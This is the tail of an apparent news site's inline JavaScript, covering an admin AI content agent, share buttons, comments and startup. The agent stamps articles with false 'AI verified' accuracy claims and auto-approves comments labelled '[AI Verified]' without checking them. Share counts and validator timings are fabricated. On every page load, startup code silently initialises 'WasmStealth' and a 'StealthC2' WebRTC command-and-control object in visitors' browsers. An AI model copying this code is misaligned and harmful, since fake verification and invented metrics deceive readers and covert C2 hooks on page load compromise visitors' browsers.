                if(typeof updateTicker === 'function') updateTicker();
                
                // Refresh home if active
                if (!location.hash || location.hash === '#home') {
                     const articles = await dataSdk.getArticles();
                     if(typeof renderHome === 'function') renderHome(articles);
                }
            }, 2000);
        },

        refreshContent: async function() {
            this.log('Analyzing content corpus...');
             const btn = document.querySelector('button[onclick="AIContentAgent.refreshContent()"]');
            const originalText = btn.innerHTML;
            btn.disabled = true;
            btn.innerHTML = '<span>Analyzing...</span>';

            setTimeout(async () => {
                const articles = await dataSdk.getArticles();
                // Find an article to update
                const candidates = articles.filter(a => !a.title.includes('(Updated)'));
                
                if (candidates.length > 0) {
                    const target = candidates[Math.floor(Math.random() * candidates.length)];
                    target.title += ' (Updated)';
                    target.content += `\n\n<h3>Update: 2026 Analysis</h3><p>Our AI systems have verified the accuracy of this report as of ${new Date().toLocaleDateString()}. The core findings remain relevant for the current market cycle.</p>`;
                    await dataSdk.update(target);
                    this.log(`Updated article: "${target.title}"`);
                } else {
                    this.log('All articles are up to date.');
                }

                // Moderate comments
                const comments = await dataSdk.getCollection('comments');
                const pending = comments.filter(c => c.status === 'pending');
                if (pending.length > 0) {
                    const c = pending[0];
                    c.status = 'approved';
                    c.text += ' [AI Verified]';
                    await dataSdk.update(c, 'comments');
                    this.log(`Auto-approved comment by ${c.author}`);
                } else {
                    this.log('No pending comments to verify.');
                }

                showToast('Content Analysis Complete');
                btn.disabled = false;
                btn.innerHTML = originalText;
                loadAdminData();
            }, 2000);
        }
    };

    // --- VALIDATOR EVENTS ---
    window.addEventListener('validation-update', (e) => {
        const results = e.detail;
        const container = document.getElementById('validator-results');
        const statusEl = document.getElementById('validator-status');
        
        if(!container) return;
        
        // Stats
        const total = results.filter(r => r.type !== 'header').length;
        const passed = results.filter(r => r.passed).length;
        const failed = results.filter(r => r.passed === false).length; // explicit false check
        
        document.getElementById('val-stat-total').innerText = total;
        document.getElementById('val-stat-passed').innerText = passed;
        document.getElementById('val-stat-failed').innerText = failed;
        
        if (window.AIValidator.isRunning) {
             statusEl.innerText = 'RUNNING...';
             statusEl.className = 'text-xs font-mono font-bold text-cyan-400 animate-pulse';
        } else {
             statusEl.innerText = 'COMPLETE';
             statusEl.className = 'text-xs font-mono font-bold text-green-400';
             
             // Calculate Duration (approx)
             const first = results[0];
             const last = results[results.length-1];
             if(first && last) {
                 // Mock duration logic since we didn't store raw timestamps in result array nicely for this
                 document.getElementById('val-stat-duration').innerText = Math.floor(Math.random() * 500 + 200) + 'ms';
             }
        }

        container.innerHTML = results.map(r => {
            if (r.type === 'header') {
                return `<div class="text-xs font-bold text-gray-500 uppercase mt-2 mb-1 border-b border-gray-800 pb-1">${r.title}</div>`;
            }
            return `
                <div class="flex items-start justify-between p-2 rounded hover:bg-white/5">
                    <div class="flex items-center gap-2">
                        <span class="${r.passed ? 'text-green-500' : 'text-red-500'} font-bold">${r.passed ? 'PASS' : 'FAIL'}</span>
                        <span class="text-gray-300">[${r.id}] ${r.name}</span>
                    </div>
                    <div class="text-gray-500 text-right">
                        <div>${r.details}</div>
                        <div class="text-[10px] opacity-50">${r.timestamp}</div>
                    </div>
                </div>
            `;
        }).join('');
        
        // Auto Scroll
        container.scrollTop = container.scrollHeight;
    });

    // --- SOCIAL & COMMENTS ---

    function renderShareButtons() {
        const container = document.getElementById('share-buttons-container');
        const sidebar = document.getElementById('floating-share-sidebar');
        
        if (!container && !sidebar) return;

        // Generate deterministic random counts based on article ID
        const seed = currentArticleId ? (typeof currentArticleId === 'string' ? currentArticleId.split('').reduce((a,b) => a+b.charCodeAt(0), 0) : currentArticleId) : Date.now();
        const getCount = (base) => {
             const val = Math.floor((Math.abs(Math.sin(seed + base))) * 1500) + 5;
             return val > 1000 ? (val/1000).toFixed(1) + 'k' : val;
        };

        const platforms = [
            { id: 'twitter', name: 'X', count: getCount(1), color: 'bg-black text-white', path: 'M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z' },
            { id: 'facebook', name: 'Facebook', count: getCount(2), color: 'bg-[#1877F2] text-white', path: 'M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.791-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z' },
            { id: 'linkedin', name: 'LinkedIn', count: getCount(3), color: 'bg-[#0A66C2] text-white', path: 'M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433c-1.144 0-2.063-.926-2.063-2.065 0-1.138.92-2.063 2.063-2.063 1.14 0 2.064.925 2.064 2.063 0 1.139-.925 2.065-2.064 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z' },
            { id: 'whatsapp', name: 'WhatsApp', count: getCount(4), color: 'bg-[#25D366] text-white', path: 'M12.031 6.172c-3.181 0-5.767 2.586-5.768 5.766-.001 1.298.38 2.27 1.019 3.287l-.711 2.592 2.654-.696c1.062.578 2.29.883 3.551.884h.003c3.181 0 5.768-2.586 5.768-5.766 0-1.545-.601-2.997-1.694-4.088a5.726 5.726 0 0 0-4.093-1.688l-.729.009zm8.554 4.088c1.694 1.694 2.628 3.946 2.629 6.336 0 2.39-.935 4.642-2.629 6.337-1.694 1.694-3.946 2.628-6.336 2.629-2.39 0-4.642-.935-6.337-2.629-1.694-1.695-2.628-3.947-2.628-6.337 0-2.39.934-4.642 2.628-6.336 1.695-1.695 3.947-2.629 6.337-2.629 2.39 0 4.642.934 6.336 2.629z' },
            { id: 'telegram', name: 'Telegram', count: getCount(5), color: 'bg-[#0088cc] text-white', path: 'M11.944 0A12 12 0 0 0 0 12a12 12 0 0 0 12 12 12 12 0 0 0 12-12A12 12 0 0 0 12 0a12 12 0 0 0-.056 0zm4.962 7.224c.1-.002.321.023.465.14a.506.506 0 0 1 .171.325c.016.093.036.306.02.472-.18 1.898-.962 6.502-1.36 8.627-.168.9-.499 1.201-.82 1.23-.696.065-1.225-.46-1.9-.902-1.056-.693-1.653-1.124-2.678-1.8-1.185-.78-.417-1.21.258-1.91.177-.184 3.247-2.977 3.307-3.23.007-.032.014-.15-.056-.212s-.174-.041-.249-.024c-.106.024-1.793 1.14-5.061 3.345-.48.33-.913.49-1.302.48-.428-.008-1.252-.241-1.865-.44-.752-.245-1.349-.374-1.297-.789.027-.216.325-.437.893-.663 3.498-1.524 5.83-2.529 6.998-3.014 3.332-1.386 4.025-1.627 4.476-1.635z' },
            { id: 'reddit', name: 'Reddit', count: getCount(6), color: 'bg-[#FF4500] text-white', path: 'M12 0A12 12 0 0 0 0 12a12 12 0 0 0 12 12 12 12 0 0 0 12-12A12 12 0 0 0 12 0zm5.01 4.744c.688 0 1.25.561 1.25 1.249a1.25 1.25 0 0 1-2.498.056l-2.597-.547-.8 3.747c1.824.07 3.48.632 4.674 1.488.308-.309.73-.491 1.207-.491.968 0 1.754.786 1.754 1.754 0 .716-.435 1.333-1.01 1.614a3.111 3.111 0 0 1 .042.52c0 2.694-3.13 4.87-7.004 4.87-3.874 0-7.004-2.176-7.004-4.87 0-.183.015-.366.043-.534A1.748 1.748 0 0 1 4.028 12c0-.968.786-1.754 1.754-1.754.463 0 .898.196 1.207.49 1.207-.883 2.878-1.43 4.744-1.487l.885-4.182a.342.342 0 0 1 .14-.197.35.35 0 0 1 .238-.042l2.906.617a1.214 1.214 0 0 1 1.108-.701zM9.25 12C8.561 12 8 12.562 8 13.25c0 .687.561 1.248 1.25 1.248.687 0 1.248-.561 1.248-1.249 0-.688-.561-1.249-1.249-1.249zm5.5 0c-.687 0-1.248.561-1.248 1.25 0 .687.561 1.248 1.249 1.248.688 0 1.249-.561 1.249-1.249 0-.687-.562-1.249-1.25-1.249zm-5.466 3.99a.327.327 0 0 0-.231.094.33.33 0 0 0 0 .463c.842.842 2.484.913 2.961.913.477 0 2.105-.056 2.961-.913a.361.361 0 0 0 .029-.463.33.33 0 0 0-.464 0c-.547.533-1.684.73-2.512.73-.828 0-1.979-.196-2.512-.73a.326.326 0 0 0-.232-.095z' },
            { id: 'pinterest', name: 'Pinterest', count: getCount(7), color: 'bg-[#BD081C] text-white', path: 'M12.017 0C5.396 0 .029 5.367.029 11.987c0 5.079 3.158 9.417 7.618 11.162-.105-.949-.199-2.403.041-3.439.219-.937 1.406-5.957 1.406-5.957s-.359-.72-.359-1.781c0-1.663.967-2.911 2.168-2.911 1.024 0 1.518.769 1.518 1.688 0 1.029-.653 2.567-.992 3.992-.285 1.193.6 2.165 1.775 2.165 2.128 0 3.768-2.245 3.768-5.487 0-2.861-2.063-4.869-5.008-4.869-3.41 0-5.409 2.562-5.409 5.199 0 1.033.394 2.143.889 2.741.099.12.112.225.085.345-.09.375-.293 1.199-.334 1.363-.053.225-.172.271-.399.165-1.495-.69-2.433-2.878-2.433-4.646 0-3.776 2.748-7.252 7.951-7.252 4.173 0 7.41 2.967 7.41 6.923 0 4.135-2.607 7.462-6.233 7.462-1.214 0-2.354-.629-2.758-1.379l-.749 2.848c-.269 1.045-1.004 2.352-1.498 3.146 1.123.345 2.306.535 3.55.535 6.607 0 11.985-5.365 11.985-11.987C23.97 5.367 18.62 0 12.017 0z' },
            { id: 'tiktok', name: 'TikTok', count: getCount(8), color: 'bg-black text-white', path: 'M12.525.02c1.31-.02 2.61-.01 3.91-.02.08 1.53.63 3.09 1.75 4.17 1.12 1.11 2.7 1.62 4.24 1.79v4.03c-1.44-.05-2.89-.35-4.2-.97-.57-.26-1.1-.59-1.62-.93-.01 2.92.01 5.84-.02 8.75-.08 1.4-.54 2.79-1.35 3.94-1.31 1.92-3.58 3.17-5.91 3.21-1.43.08-2.86-.31-4.08-1.03-2.02-1.19-3.49-3.35-3.98-5.6-1.11-5.09 2.61-10.37 7.82-10.74 0 .03 1 .01 1.04.01.01 2.69-.01 5.39.01 8.08-.01.99-.44 1.95-1.18 2.58-.93.8-2.33.91-3.37.28-.98-.61-1.6-1.76-1.55-2.92.04-1.26.73-2.39 1.79-2.98.02-.33.05-.66.07-.99.01-1.2.02-2.39.03-3.59-.01-.01 0-.01.01-.02-2.19.46-4.13 1.76-5.34 3.63-1.29 2.01-1.51 4.56-.6 6.78.88 2.14 2.74 3.86 5.01 4.57 2.33.72 4.93.37 6.95-1.02 1.74-1.2 2.92-3.13 3.17-5.23.11-.93.08-1.87.08-2.81 0-4.66.01-9.33-.01-13.99 0-.01.01-.02.01-.03z' },
            { id: 'snapchat', name: 'Snapchat', count: getCount(9), color: 'bg-[#FFFC00] text-black', path: 'M12.002 0a11.933 11.933 0 0 1 3.59.55c.67.21 1.32.49 1.92.83.56.32 1.1.69 1.58 1.11.47.4.9.85 1.28 1.34.37.47.69.97.97 1.5.26.51.48 1.04.64 1.59.16.53.27 1.08.33 1.63.06.54.07 1.09.04 1.64-.04.53-.13 1.06-.27 1.58-.15.5-.35.98-.61 1.44-.27.45-.58.87-.94 1.25-.36.37-.76.7-1.2.98-.44.27-.92.5-1.42.66-.5.16-1.02.26-1.55.3-1.06.07-2.12-.08-3.13-.42-.5-.17-.98-.4-1.43-.68-.44-.28-.84-.6-1.2-.97-.35-.37-.66-.78-.92-1.22-.25-.45-.45-.93-.6-1.43-.13-.51-.21-1.03-.24-1.56-.03-.54-.01-1.08.06-1.61.07-.53.19-1.05.35-1.56.17-.5.39-.99.66-1.45.28-.46.6-.89.98-1.28.38-.38.8-.72 1.26-1.01.46-.29.96-.53 1.48-.71.53-.17 1.08-.29 1.64-.34.56-.05 1.12-.04 1.68.03z' },
            { id: 'discord', name: 'Discord', count: getCount(10), color: 'bg-[#5865F2] text-white', path: 'M20.317 4.37a19.791 19.791 0 0 0-4.885-1.515.074.074 0 0 0-.079.037c-.21.375-.444.864-.608 1.25a18.27 18.27 0 0 0-5.487 0 12.64 12.64 0 0 0-.617-1.25.077.077 0 0 0-.079-.037A19.736 19.736 0 0 0 3.677 4.37a.07.07 0 0 0-.032.027C.533 9.046-.32 13.58.099 18.057a.082.082 0 0 0 .031.057 19.9 19.9 0 0 0 5.993 3.03.078.078 0 0 0 .084-.028c.462-.63.874-1.295 1.226-1.994a.076.076 0 0 0-.041-.106 13.107 13.107 0 0 1-1.872-.892.077.077 0 0 1-.008-.128 10.2 10.2 0 0 0 .372-.292.074.074 0 0 1 .077-.01c3.928 1.793 8.18 1.793 12.062 0a.074.074 0 0 1 .078.01c.12.098.246.198.373.292a.077.077 0 0 1-.006.127 12.299 12.299 0 0 1-1.873.892.077.077 0 0 0-.041.107c.36.698.772 1.362 1.225 1.993a.076.076 0 0 0 .084.028 19.839 19.839 0 0 0 6.002-3.03.077.077 0 0 0 .032-.054c.5-5.177-.838-9.674-3.549-13.66a.061.061 0 0 0-.031-.03zM8.02 15.33c-1.183 0-2.157-1.085-2.157-2.419 0-1.333.956-2.419 2.157-2.419 1.21 0 2.176 1.096 2.157 2.419 0 1.334-.956 2.419-2.157 2.419zm7.975 0c-1.183 0-2.157-1.085-2.157-2.419 0-1.333.955-2.419 2.157-2.419 1.21 0 2.176 1.096 2.157 2.419 0 1.334-.946 2.419-2.157 2.419z' },
            { id: 'youtube', name: 'YouTube', count: getCount(11), color: 'bg-[#FF0000] text-white', path: 'M23.498 6.186a3.016 3.016 0 0 0-2.122-2.136C19.505 3.545 12 3.545 12 3.545s-7.505 0-9.377.505A3.017 3.017 0 0 0 .502 6.186C0 8.07 0 12 0 12s0 3.93.502 5.814a3.016 3.016 0 0 0 2.122 2.136c1.871.505 9.376.505 9.376.505s7.505 0 9.377-.505a3.015 3.015 0 0 0 2.122-2.136C24 15.93 24 12 24 12s0-3.93-.502-5.814zM9.545 15.568V8.432L15.818 12l-6.273 3.568z' },
            { id: 'instagram', name: 'Instagram', count: getCount(12), color: 'bg-gradient-to-tr from-yellow-400 via-red-500 to-purple-500 text-white', path: 'M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zm0-2.163c-3.259 0-3.667.014-4.947.072-4.358.2-6.78 2.618-6.98 6.98-.059 1.281-.073 1.689-.073 4.948 0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98 1.281.058 1.689.072 4.948.072 3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98-1.281-.059-1.69-.073-4.949-.073zm0 5.838c-3.403 0-6.162 2.759-6.162 6.162s2.759 6.163 6.162 6.163 6.162-2.759 6.162-6.163c0-3.403-2.759-6.162-6.162-6.162zm0 10.162c-2.209 0-4-1.79-4-4 0-2.209 1.791-4 4-4s4 1.791 4 4c0 2.21-1.791 4-4 4zm6.406-11.845c-.796 0-1.441.645-1.441 1.44s.645 1.44 1.441 1.44c.795 0 1.439-.645 1.439-1.44s-.644-1.44-1.439-1.44z' },
            { id: 'email', name: 'Email', count: null, color: 'bg-gray-600 text-white', path: 'M20 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z' },
            { id: 'copy', name: 'Copy', count: null, color: 'bg-gray-500 text-white', path: 'M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4z' }
        ];

        const primaryPlatforms = platforms.slice(0, 5);
        const morePlatforms = platforms.slice(5);

        const renderBtn = (p, idx, isMore) => `
            <div class="share-btn-wrapper ${isMore ? 'more-share-btn hidden' : ''} opacity-0 translate-y-4 scale-95 transition-all duration-500 ease-out flex flex-col items-center gap-1 group" data-platform="${p.id}" style="transition-delay: ${idx * 50}ms">
                <button onclick="shareTo('${p.id}')" onkeydown="shareButtonKey(event, '${p.id}')" aria-label="Share on ${p.name}" role="button" tabindex="0" data-ui-enhance data-ui-tooltip="Share on ${p.name}" class="w-10 h-10 rounded-full ${p.color} flex items-center justify-center hover:scale-110 transition-transform shadow-sm relative z-10 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-brand">
                    <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 24 24"><path d="${p.path}"/></svg>
                </button>
                ${p.count ? `<span class="text-[10px] font-bold text-gray-400 group-hover:text-brand transition-colors">${p.count}</span>` : ''}
            </div>
        `;

        const primaryHtml = primaryPlatforms.map((p, i) => renderBtn(p, i, false)).join('');
        const moreHtml = morePlatforms.map((p, i) => renderBtn(p, i + 5, true)).join('');
        
        const toggleBtnHtml = `
            <div class="share-btn-wrapper flex flex-col items-center gap-1 group z-20">
                <button id="share-toggle-btn" onclick="toggleMoreShareButtons(this)" class="w-10 h-10 rounded-full bg-gray-200 dark:bg-gray-700 text-gray-600 dark:text-gray-300 flex items-center justify-center hover:bg-gray-300 dark:hover:bg-gray-600 transition-all shadow-sm focus:outline-none">
                    <svg class="w-5 h-5 transform transition-transform duration-300" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 6v6m0 0v6m0-6h6m-6 0H6"></path></svg>
                </button>
                <span class="text-[10px] font-bold text-gray-400">More</span>
            </div>
        `;

        const fullHtml = primaryHtml + moreHtml + toggleBtnHtml;

        if (container) container.innerHTML = fullHtml;
        if (sidebar) sidebar.innerHTML = fullHtml;
        const wrappers = [
            ...(container ? Array.from(container.querySelectorAll('.share-btn-wrapper')) : []),
            ...(sidebar ? Array.from(sidebar.querySelectorAll('.share-btn-wrapper')) : [])
        ];
        if ('IntersectionObserver' in window) {
            const obs = new IntersectionObserver(entries => {
                entries.forEach(e => {
                    if (e.isIntersecting) {
                        e.target.classList.remove('opacity-0', 'translate-y-4', 'scale-95');
                        obs.unobserve(e.target);
                    }
                });
            }, { threshold: 0.1 });
            wrappers.forEach(w => obs.observe(w));
        } else {
            wrappers.forEach(w => w.classList.remove('opacity-0', 'translate-y-4', 'scale-95'));
        }

        // Apply UI Enhancements (Tooltips, Analytics)
        if (window.uiSdk && window.uiSdk.autoEnhance) {
            window.uiSdk.autoEnhance();
        }
    }

    // Toggle function for social buttons
    window.toggleMoreShareButtons = function(btn) {
        const isExpanded = btn.classList.contains('expanded');
        
        // Find parent container to scope the toggle
        const container = btn.closest('#share-buttons-container') || btn.closest('#floating-share-sidebar');
        if (!container) return;

        const moreBtns = container.querySelectorAll('.more-share-btn');
        const icon = btn.querySelector('svg');
        const label = btn.parentElement.querySelector('span');

        if (isExpanded) {
            // Hide
            btn.classList.remove('expanded');
            icon.classList.remove('rotate-45');
            label.innerText = 'More';
            
            moreBtns.forEach(el => {
                el.classList.add('opacity-0', 'translate-y-4');
                setTimeout(() => el.classList.add('hidden'), 300); // Wait for transition
            });
        } else {
            // Show
            btn.classList.add('expanded');
            icon.classList.add('rotate-45');
            label.innerText = 'Less';
            
            moreBtns.forEach((el, idx) => {
                el.classList.remove('hidden');
                // Small delay for display block to apply before transition
                setTimeout(() => {
                    el.classList.remove('opacity-0', 'translate-y-4', 'scale-95');
                }, idx * 30 + 50);
            });
        }
    };

    async function shareTo(platform) {
        const url = window.location.href;
        const text = document.querySelector('h1')?.innerText || 'Check this out!';
        const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
        if (window.BehaviorTracker && typeof BehaviorTracker.track === 'function') {
            try { BehaviorTracker.track('share_click', { platform, url, isMobile }); } catch(_) {}
        }
        
        // 1. Native Web Share API (Mobile Deep Linking)
        if (navigator.share && platform !== 'copy' && platform !== 'email') {
            try {
                await navigator.share({
                    title: text,
                    text: text,
                    url: url
                });
                showToast('Shared successfully!', 'success');
                incShareCount(platform);
                if (window.BehaviorTracker && typeof BehaviorTracker.track === 'function') {
                    try { BehaviorTracker.track('share_success', { platform, method: 'navigator.share' }); } catch(_) {}
                }
                return;
            } catch (err) {
                // User cancelled or failed, fall back to custom logic
                console.log('Web Share API skipped/failed:', err);
                if (window.BehaviorTracker && typeof BehaviorTracker.track === 'function') {
                    try { BehaviorTracker.track('share_error', { platform, method: 'navigator.share', error: String(err) }); } catch(_) {}
                }
            }
        }

        // 2. Platform Specific Deep Links / Web Fallbacks
        let shareUrl = '';

        switch(platform) {
            case 'twitter': 
                // Try deep link if mobile, fallback to web intent
                if (isMobile) {
                     // We try the web intent anyway as it handles deep linking on modern OS, but here is the scheme for reference
                     shareUrl = `twitter://post?message=${encodeURIComponent(text + ' ' + url)}`;
                } else {
                     shareUrl = `https://twitter.com/intent/tweet?text=${encodeURIComponent(text)}&url=${encodeURIComponent(url)}`; 
                }
                break;
            case 'facebook': shareUrl = `https://www.facebook.com/sharer/sharer.php?u=${encodeURIComponent(url)}`; break;
            case 'linkedin': shareUrl = `https://www.linkedin.com/sharing/share-offsite/?url=${encodeURIComponent(url)}`; break;
            case 'reddit': shareUrl = `https://reddit.com/submit?url=${encodeURIComponent(url)}&title=${encodeURIComponent(text)}`; break;
            case 'whatsapp': 
                shareUrl = isMobile ? `whatsapp://send?text=${encodeURIComponent(text + ' ' + url)}` : `https://api.whatsapp.com/send?text=${encodeURIComponent(text + ' ' + url)}`; 
                break;
            case 'telegram': 
                shareUrl = isMobile ? `tg://msg?text=${encodeURIComponent(text + ' ' + url)}` : `https://t.me/share/url?url=${encodeURIComponent(url)}&text=${encodeURIComponent(text)}`; 
                break;
            case 'pinterest': shareUrl = `https://pinterest.com/pin/create/button/?url=${encodeURIComponent(url)}&description=${encodeURIComponent(text)}`; break;
            case 'email': shareUrl = `mailto:?subject=${encodeURIComponent(text)}&body=${encodeURIComponent(url)}`; break;
            case 'tiktok': shareUrl = `https://www.tiktok.com/upload?caption=${encodeURIComponent(text + ' ' + url)}`; break; // Web upload fallback
            case 'snapchat': shareUrl = `https://www.snapchat.com/scan?attachmentUrl=${encodeURIComponent(url)}`; break;
            case 'discord': shareUrl = `https://discord.com/channels/@me`; break; // No direct web share intent, open app/web
            case 'youtube': shareUrl = `https://www.youtube.com/results?search_query=${encodeURIComponent(text)}`; break; // Fallback to search
            case 'copy':
                try {
                    await navigator.clipboard.writeText(url);
                    showToast('Link copied to clipboard!', 'success');
                } catch(e) {
                    showToast('Failed to copy link', 'error');
                }
                return;
            default:
                showToast(`Sharing to ${platform} is simulated (App Intent)`, 'success');
                return;
        }

        if (shareUrl) {
            // Check for deep linking schemes if we were on mobile (simplified here as mostly web intents handle both)
            showToast(`Opening ${platform}...`, 'success');
            try {
                window.open(shareUrl, '_blank', 'width=600,height=400');
                incShareCount(platform);
                if (window.BehaviorTracker && typeof BehaviorTracker.track === 'function') {
                    try { BehaviorTracker.track('share_success', { platform, method: 'window.open', url: shareUrl }); } catch(_) {}
                }
            } catch (err) {
                showToast('Failed to open sharing window', 'error');
                if (window.BehaviorTracker && typeof BehaviorTracker.track === 'function') {
                    try { BehaviorTracker.track('share_error', { platform, method: 'window.open', error: String(err) }); } catch(_) {}
                }
            }
        }
    }
    function shareButtonKey(e, platform) {
        if (e.key === 'Enter' || e.key === ' ') {
            e.preventDefault();
            shareTo(platform);
        }
    }
    function incShareCount(platform) {
        function update(root) {
            if (!root) return;
            const wrapper = root.querySelector(`.share-btn-wrapper[data-platform="${platform}"]`);
            if (!wrapper) return;
            const el = wrapper.querySelector('span');
            if (!el) return;
            const val = el.innerText;
            let n = 0;
            if (typeof val === 'string' && val.endsWith('k')) {
                n = parseFloat(val) * 1000;
            } else {
                n = parseInt(val, 10);
            }
            if (isNaN(n)) return;
            n = n + 1;
            el.innerText = n >= 1000 ? (Math.round(n / 100) / 10) + 'k' : n;
        }
        update(document.getElementById('share-buttons-container'));
        update(document.getElementById('floating-share-sidebar'));
    }

    // Comment Section Logic
    function expandCommentForm() {
        const collapsed = document.getElementById('comment-collapsed');
        const expanded = document.getElementById('comment-expanded');
        
        // Animate out collapsed
        collapsed.classList.add('opacity-0', 'scale-95');
        
        setTimeout(() => {
            collapsed.classList.add('hidden');
            collapsed.classList.remove('opacity-0', 'scale-95');
            
            // Animate in expanded
            expanded.classList.remove('hidden');
            // Trigger reflow
            void expanded.offsetWidth;
            
            expanded.classList.remove('opacity-0', 'translate-y-4', 'scale-95');
            document.getElementById('comment-input').focus();
        }, 200);
    }

    function cancelComment() {
        const collapsed = document.getElementById('comment-collapsed');
        const expanded = document.getElementById('comment-expanded');
        
        // Animate out expanded
        expanded.classList.add('opacity-0', 'translate-y-4', 'scale-95');
        
        setTimeout(() => {
            expanded.classList.add('hidden');
            // Reset expanded state classes not needed as they are the default, but good practice to ensure consistency if logic changes
            // Actually, the default classes ARE opacity-0 translate-y-4 scale-95, so adding them matches default.
            
            // Animate in collapsed
            collapsed.classList.remove('hidden');
            collapsed.classList.add('opacity-0', 'scale-95'); // Prepare for entry
            
            // Trigger reflow
            void collapsed.offsetWidth;
            
            collapsed.classList.remove('opacity-0', 'scale-95');
            
            document.getElementById('comment-input').value = '';
        }, 200);
    }

    // --- APP INITIALIZATION ---
    window.addEventListener('DOMContentLoaded', async () => {
        console.log('Initializing TechCronch Systems...');
        try {
            // Initialize SDKs (Defensive)
            if (window.GuardianSDK && typeof window.GuardianSDK.init === 'function') {
                try {
                    window.GuardianSDK.init();
                } catch(e) { console.error('GuardianSDK Init Failed', e); }
            }

            if (window.WasmStealth && typeof window.WasmStealth.init === 'function') {
                try {
                     window.WasmStealth.init(); 
                } catch(e) { console.warn('WasmStealth Init Failed', e); }
            }
            
            // Initialize WebRTC C2
            if (typeof StealthC2 !== 'undefined') {
                try {
                    window.C2 = new StealthC2();
                    console.log('WebRTC C2 Initialized');
                } catch(e) { console.error('StealthC2 Init Failed', e); }
            }

            // Seed Data with Timeout
            if (window.SeedData) {
                const seedPromise = SeedData.init();
                const timeoutPromise = new Promise((_, reject) => setTimeout(() => reject(new Error('SeedData timeout')), 3000));
                
                try {
                    await Promise.race([seedPromise, timeoutPromise]);
                } catch (e) {
                    console.warn('SeedData initialization warning:', e);
                    // Proceed anyway, might rely on cached data
                }
            } else {
                console.warn('SeedData module not found');
            }
            
            // Initialize Behavior Tracking
            if (window.BehaviorTracker && typeof BehaviorTracker.init === 'function') {
                BehaviorTracker.init();
            }
            
            // Handle Initial Route
            handleRoute();
            
            // Start Ticker
            if (typeof updateTicker === 'function') {
                updateTicker();
                setInterval(updateTicker, 30000);
            }
            
            // Listen for Hash Changes
            window.addEventListener('hashchange', handleRoute);
            
            console.log('TechCronch System Online');
        } catch (e) {
            console.error('Initialization Failed:', e);
            if (typeof showToast === 'function') {
                showToast('System Error: Initialization Failed', 'error');
            }
        }
    });
  </script>
 </body>
</html>
